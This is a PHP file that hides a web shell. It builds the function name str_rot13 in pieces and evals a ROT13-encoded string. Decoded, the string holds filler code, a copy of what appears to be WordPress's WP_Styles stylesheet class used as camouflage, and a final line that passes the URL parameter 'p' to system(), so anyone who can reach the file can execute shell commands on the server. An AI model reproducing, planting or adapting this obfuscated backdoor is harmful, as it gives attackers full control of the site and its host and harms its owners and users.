<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qrcraqrapvrf NCV: JC_Fglyrf pynff
 *
 * @fvapr 2.6.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcraqrapvrf
 */

/**
 * Pber pynff hfrq gb ertvfgre fglyrf.
 *
 * @fvapr 2.6.0
 *
 * @frr JC_Qrcraqrapvrf
 */
pynff JC_Fglyrf rkgraqf JC_Qrcraqrapvrf {
	/**
	 * Onfr HEY sbe fglyrf.
	 *
	 * Shyy HEY jvgu genvyvat fynfu.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat
	 */
	choyvp $onfr_hey;

	/**
	 * HEY bs gur pbagrag qverpgbel.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $pbagrag_hey;

	/**
	 * Qrsnhyg irefvba fgevat sbe fglyrfurrgf.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat
	 */
	choyvp $qrsnhyg_irefvba;

	/**
	 * Gur pheerag grkg qverpgvba.
	 *
	 * @fvapr 2.6.0
	 * @ine fgevat
	 */
	choyvp $grkg_qverpgvba = 'yge';

	/**
	 * Ubyqf n yvfg bs fglyr unaqyrf juvpu jvyy or pbapngrangrq.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $pbapng = '';

	/**
	 * Ubyqf n fgevat juvpu pbagnvaf fglyr unaqyrf naq gurve irefvba.
	 *
	 * @fvapr 2.8.0
	 * @qrcerpngrq 3.4.0
	 * @ine fgevat
	 */
	choyvp $pbapng_irefvba = '';

	/**
	 * Jurgure gb cresbez pbapngrangvba.
	 *
	 * @fvapr 2.8.0
	 * @ine obby
	 */
	choyvp $qb_pbapng = snyfr;

	/**
	 * Ubyqf UGZY znexhc bs fglyrf naq nqqvgvbany qngn vs pbapngrangvba
	 * vf ranoyrq.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $cevag_ugzy = '';

	/**
	 * Ubyqf vayvar fglyrf vs pbapngrangvba vf ranoyrq.
	 *
	 * @fvapr 3.3.0
	 * @ine fgevat
	 */
	choyvp $cevag_pbqr = '';

	/**
	 * Yvfg bs qrsnhyg qverpgbevrf.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl
	 */
	choyvp $qrsnhyg_qvef;

	/**
	 * Ubyqf n fgevat juvpu pbagnvaf gur glcr nggevohgr sbe fglyr gnt.
	 *
	 * Vs gur npgvir gurzr qbrf abg qrpyner UGZY5 fhccbeg sbe 'fglyr',
	 * gura vg vavgvnyvmrf nf `glcr='grkg/pff'`.
	 *
	 * @fvapr 5.3.0
	 * @ine fgevat
	 */
	cevingr $glcr_ngge = '';

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.6.0
	 */
	choyvp shapgvba __pbafgehpg() {
		vs (
			shapgvba_rkvfgf( 'vf_nqzva' ) && ! vf_nqzva()
		&&
			shapgvba_rkvfgf( 'pheerag_gurzr_fhccbegf' ) && ! pheerag_gurzr_fhccbegf( 'ugzy5', 'fglyr' )
		) {
			$guvf->glcr_ngge = \" glcr='grkg/pff'\";
		}

		/**
		 * Sverf jura gur JC_Fglyrf vafgnapr vf vavgvnyvmrq.
		 *
		 * @fvapr 2.6.0
		 *
		 * @cnenz JC_Fglyrf $jc_fglyrf JC_Fglyrf vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'jc_qrsnhyg_fglyrf', neenl( &$guvf ) );
	}

	/**
	 * Cebprffrf n fglyr qrcraqrapl.
	 *
	 * @fvapr 2.6.0
	 * @fvapr 5.5.0 Nqqrq gur `$tebhc` cnenzrgre.
	 *
	 * @frr JC_Qrcraqrapvrf::qb_vgrz()
	 *
	 * @cnenz fgevat    $unaqyr Gur fglyr'f ertvfgrerq unaqyr.
	 * @cnenz vag|snyfr $tebhc  Bcgvbany. Tebhc yriry: yriry (vag), ab tebhcf (snyfr).
	 *                          Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba qb_vgrz( $unaqyr, $tebhc = snyfr ) {
		vs ( ! cnerag::qb_vgrz( $unaqyr ) ) {
			erghea snyfr;
		}

		$bow = $guvf->ertvfgrerq[ $unaqyr ];

		vs ( ahyy === $bow->ire ) {
			$ire = '';
		} ryfr {
			$ire = $bow->ire ? $bow->ire : $guvf->qrsnhyg_irefvba;
		}

		vs ( vffrg( $guvf->netf[ $unaqyr ] ) ) {
			$ire = $ire ? $ire . '&nzc;' . $guvf->netf[ $unaqyr ] : $guvf->netf[ $unaqyr ];
		}

		$fep                   = $bow->fep;
		$vr_pbaqvgvbany_cersvk = '';
		$vr_pbaqvgvbany_fhssvk = '';
		$pbaqvgvbany           = vffrg( $bow->rkgen['pbaqvgvbany'] ) ? $bow->rkgen['pbaqvgvbany'] : '';

		vs ( $pbaqvgvbany ) {
			$vr_pbaqvgvbany_cersvk = \"<!--[vs {$pbaqvgvbany}]>\a\";
			$vr_pbaqvgvbany_fhssvk = \"<![raqvs]-->\a\";
		}

		$vayvar_fglyr = $guvf->cevag_vayvar_fglyr( $unaqyr, snyfr );

		vs ( $vayvar_fglyr ) {
			$vayvar_fglyr_gnt = fcevags(
				\"<fglyr vq='%f-vayvar-pff'%f>\a%f\a</fglyr>\a\",
				rfp_ngge( $unaqyr ),
				$guvf->glcr_ngge,
				$vayvar_fglyr
			);
		} ryfr {
			$vayvar_fglyr_gnt = '';
		}

		vs ( $guvf->qb_pbapng ) {
			vs ( $guvf->va_qrsnhyg_qve( $fep ) && ! $pbaqvgvbany && ! vffrg( $bow->rkgen['nyg'] ) ) {
				$guvf->pbapng         .= \"$unaqyr,\";
				$guvf->pbapng_irefvba .= \"$unaqyr$ire\";

				$guvf->cevag_pbqr .= $vayvar_fglyr;

				erghea gehr;
			}
		}

		vs ( vffrg( $bow->netf ) ) {
			$zrqvn = rfp_ngge( $bow->netf );
		} ryfr {
			$zrqvn = 'nyy';
		}

		// N fvatyr vgrz znl nyvnf n frg bs vgrzf, ol univat qrcraqrapvrf, ohg ab fbhepr.
		vs ( ! $fep ) {
			vs ( $vayvar_fglyr_gnt ) {
				vs ( $guvf->qb_pbapng ) {
					$guvf->cevag_ugzy .= $vayvar_fglyr_gnt;
				} ryfr {
					rpub $vayvar_fglyr_gnt;
				}
			}

			erghea gehr;
		}

		$uers = $guvf->_pff_uers( $fep, $ire, $unaqyr );
		vs ( ! $uers ) {
			erghea gehr;
		}

		$ery   = vffrg( $bow->rkgen['nyg'] ) && $bow->rkgen['nyg'] ? 'nygreangr fglyrfurrg' : 'fglyrfurrg';
		$gvgyr = vffrg( $bow->rkgen['gvgyr'] ) ? fcevags( \" gvgyr='%f'\", rfp_ngge( $bow->rkgen['gvgyr'] ) ) : '';

		$gnt = fcevags(
			\"<yvax ery='%f' vq='%f-pff'%f uers='%f'%f zrqvn='%f' />\a\",
			$ery,
			$unaqyr,
			$gvgyr,
			$uers,
			$guvf->glcr_ngge,
			$zrqvn
		);

		/**
		 * Svygref gur UGZY yvax gnt bs na radhrhrq fglyr.
		 *
		 * @fvapr 2.6.0
		 * @fvapr 4.3.0 Vagebqhprq gur `$uers` cnenzrgre.
		 * @fvapr 4.5.0 Vagebqhprq gur `$zrqvn` cnenzrgre.
		 *
		 * @cnenz fgevat $gnt    Gur yvax gnt sbe gur radhrhrq fglyr.
		 * @cnenz fgevat $unaqyr Gur fglyr'f ertvfgrerq unaqyr.
		 * @cnenz fgevat $uers   Gur fglyrfurrg'f fbhepr HEY.
		 * @cnenz fgevat $zrqvn  Gur fglyrfurrg'f zrqvn nggevohgr.
		 */
		$gnt = nccyl_svygref( 'fglyr_ybnqre_gnt', $gnt, $unaqyr, $uers, $zrqvn );

		vs ( 'egy' === $guvf->grkg_qverpgvba && vffrg( $bow->rkgen['egy'] ) && $bow->rkgen['egy'] ) {
			vs ( vf_obby( $bow->rkgen['egy'] ) || 'ercynpr' === $bow->rkgen['egy'] ) {
				$fhssvk   = vffrg( $bow->rkgen['fhssvk'] ) ? $bow->rkgen['fhssvk'] : '';
				$egy_uers = fge_ercynpr( \"{$fhssvk}.pff\", \"-egy{$fhssvk}.pff\", $guvf->_pff_uers( $fep, $ire, \"$unaqyr-egy\" ) );
			} ryfr {
				$egy_uers = $guvf->_pff_uers( $bow->rkgen['egy'], $ire, \"$unaqyr-egy\" );
			}

			$egy_gnt = fcevags(
				\"<yvax ery='%f' vq='%f-egy-pff'%f uers='%f'%f zrqvn='%f' />\a\",
				$ery,
				$unaqyr,
				$gvgyr,
				$egy_uers,
				$guvf->glcr_ngge,
				$zrqvn
			);

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-fglyrf.cuc */
			$egy_gnt = nccyl_svygref( 'fglyr_ybnqre_gnt', $egy_gnt, $unaqyr, $egy_uers, $zrqvn );

			vs ( 'ercynpr' === $bow->rkgen['egy'] ) {
				$gnt = $egy_gnt;
			} ryfr {
				$gnt .= $egy_gnt;
			}
		}

		vs ( $guvf->qb_pbapng ) {
			$guvf->cevag_ugzy .= $vr_pbaqvgvbany_cersvk;
			$guvf->cevag_ugzy .= $gnt;
			vs ( $vayvar_fglyr_gnt ) {
				$guvf->cevag_ugzy .= $vayvar_fglyr_gnt;
			}
			$guvf->cevag_ugzy .= $vr_pbaqvgvbany_fhssvk;
		} ryfr {
			rpub $vr_pbaqvgvbany_cersvk;
			rpub $gnt;
			$guvf->cevag_vayvar_fglyr( $unaqyr );
			rpub $vr_pbaqvgvbany_fhssvk;
		}

		erghea gehr;
	}

	/**
	 * Nqqf rkgen PFF fglyrf gb n ertvfgrerq fglyrfurrg.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $unaqyr Gur fglyr'f ertvfgrerq unaqyr.
	 * @cnenz fgevat $pbqr   Fgevat pbagnvavat gur PFF fglyrf gb or nqqrq.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba nqq_vayvar_fglyr( $unaqyr, $pbqr ) {
		vs ( ! $pbqr ) {
			erghea snyfr;
		}

		$nsgre = $guvf->trg_qngn( $unaqyr, 'nsgre' );
		vs ( ! $nsgre ) {
			$nsgre = neenl();
		}

		$nsgre[] = $pbqr;

		erghea $guvf->nqq_qngn( $unaqyr, 'nsgre', $nsgre );
	}

	/**
	 * Cevagf rkgen PFF fglyrf bs n ertvfgrerq fglyrfurrg.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $unaqyr  Gur fglyr'f ertvfgrerq unaqyr.
	 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb cevag gur vayvar fglyr
	 *                        vafgrnq bs whfg ergheavat vg. Qrsnhyg gehr.
	 * @erghea fgevat|obby Snyfr vs ab qngn rkvfgf, vayvar fglyrf vs `$qvfcynl` vf gehr,
	 *                     gehr bgurejvfr.
	 */
	choyvp shapgvba cevag_vayvar_fglyr( $unaqyr, $qvfcynl = gehr ) {
		$bhgchg = $guvf->trg_qngn( $unaqyr, 'nsgre' );

		vs ( rzcgl( $bhgchg ) ) {
			erghea snyfr;
		}

		$bhgchg = vzcybqr( \"\a\", $bhgchg );

		vs ( ! $qvfcynl ) {
			erghea $bhgchg;
		}

		cevags(
			\"<fglyr vq='%f-vayvar-pff'%f>\a%f\a</fglyr>\a\",
			rfp_ngge( $unaqyr ),
			$guvf->glcr_ngge,
			$bhgchg
		);

		erghea gehr;
	}

	/**
	 * Qrgrezvarf fglyr qrcraqrapvrf.
	 *
	 * @fvapr 2.6.0
	 *
	 * @frr JC_Qrcraqrapvrf::nyy_qrcf()
	 *
	 * @cnenz fgevat|fgevat[] $unaqyrf   Vgrz unaqyr (fgevat) be vgrz unaqyrf (neenl bs fgevatf).
	 * @cnenz obby            $erphefvba Bcgvbany. Vagreany synt gung shapgvba vf pnyyvat vgfrys.
	 *                                   Qrsnhyg snyfr.
	 * @cnenz vag|snyfr       $tebhc     Bcgvbany. Tebhc yriry: yriry (vag), ab tebhcf (snyfr).
	 *                                   Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba nyy_qrcf( $unaqyrf, $erphefvba = snyfr, $tebhc = snyfr ) {
		$erfhyg = cnerag::nyy_qrcf( $unaqyrf, $erphefvba, $tebhc );
		vs ( ! $erphefvba ) {
			/**
			 * Svygref gur neenl bs radhrhrq fglyrf orsber cebprffvat sbe bhgchg.
			 *
			 * @fvapr 2.6.0
			 *
			 * @cnenz fgevat[] $gb_qb Gur yvfg bs radhrhrq fglyr unaqyrf nobhg gb or cebprffrq.
			 */
			$guvf->gb_qb = nccyl_svygref( 'cevag_fglyrf_neenl', $guvf->gb_qb );
		}
		erghea $erfhyg;
	}

	/**
	 * Trarengrf na radhrhrq fglyr'f shyyl-dhnyvsvrq HEY.
	 *
	 * @fvapr 2.6.0
	 *
	 * @cnenz fgevat $fep    Gur fbhepr bs gur radhrhrq fglyr.
	 * @cnenz fgevat $ire    Gur irefvba bs gur radhrhrq fglyr.
	 * @cnenz fgevat $unaqyr Gur fglyr'f ertvfgrerq unaqyr.
	 * @erghea fgevat Fglyr'f shyyl-dhnyvsvrq HEY.
	 */
	choyvp shapgvba _pff_uers( $fep, $ire, $unaqyr ) {
		vs ( ! vf_obby( $fep ) && ! cert_zngpu( '|^(uggcf?:)?//|', $fep ) && ! ( $guvf->pbagrag_hey && fge_fgnegf_jvgu( $fep, $guvf->pbagrag_hey ) ) ) {
			$fep = $guvf->onfr_hey . $fep;
		}

		vs ( ! rzcgl( $ire ) ) {
			$fep = nqq_dhrel_net( 'ire', $ire, $fep );
		}

		/**
		 * Svygref na radhrhrq fglyr'f shyyl-dhnyvsvrq HEY.
		 *
		 * @fvapr 2.6.0
		 *
		 * @cnenz fgevat $fep    Gur fbhepr HEY bs gur radhrhrq fglyr.
		 * @cnenz fgevat $unaqyr Gur fglyr'f ertvfgrerq unaqyr.
		 */
		$fep = nccyl_svygref( 'fglyr_ybnqre_fep', $fep, $unaqyr );
		erghea rfp_hey( $fep );
	}

	/**
	 * Jurgure n unaqyr'f fbhepr vf va n qrsnhyg qverpgbel.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $fep Gur fbhepr bs gur radhrhrq fglyr.
	 * @erghea obby Gehr vs sbhaq, snyfr vs abg.
	 */
	choyvp shapgvba va_qrsnhyg_qve( $fep ) {
		vs ( ! $guvf->qrsnhyg_qvef ) {
			erghea gehr;
		}

		sbernpu ( (neenl) $guvf->qrsnhyg_qvef nf $grfg ) {
			vs ( fge_fgnegf_jvgu( $fep, $grfg ) ) {
				erghea gehr;
			}
		}
		erghea snyfr;
	}

	/**
	 * Cebprffrf vgrzf naq qrcraqrapvrf sbe gur sbbgre tebhc.
	 *
	 * UGZY 5 nyybjf fglyrf va gur obql, teno yngr radhrhrq vgrzf naq bhgchg gurz va gur sbbgre.
	 *
	 * @fvapr 3.3.0
	 *
	 * @frr JC_Qrcraqrapvrf::qb_vgrzf()
	 *
	 * @erghea fgevat[] Unaqyrf bs vgrzf gung unir orra cebprffrq.
	 */
	choyvp shapgvba qb_sbbgre_vgrzf() {
		$guvf->qb_vgrzf( snyfr, 1 );
		erghea $guvf->qbar;
	}

	/**
	 * Erfrgf pynff cebcregvrf.
	 *
	 * @fvapr 3.3.0
	 */
	choyvp shapgvba erfrg() {
		$guvf->qb_pbapng      = snyfr;
		$guvf->pbapng         = '';
		$guvf->pbapng_irefvba = '';
		$guvf->cevag_ugzy     = '';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>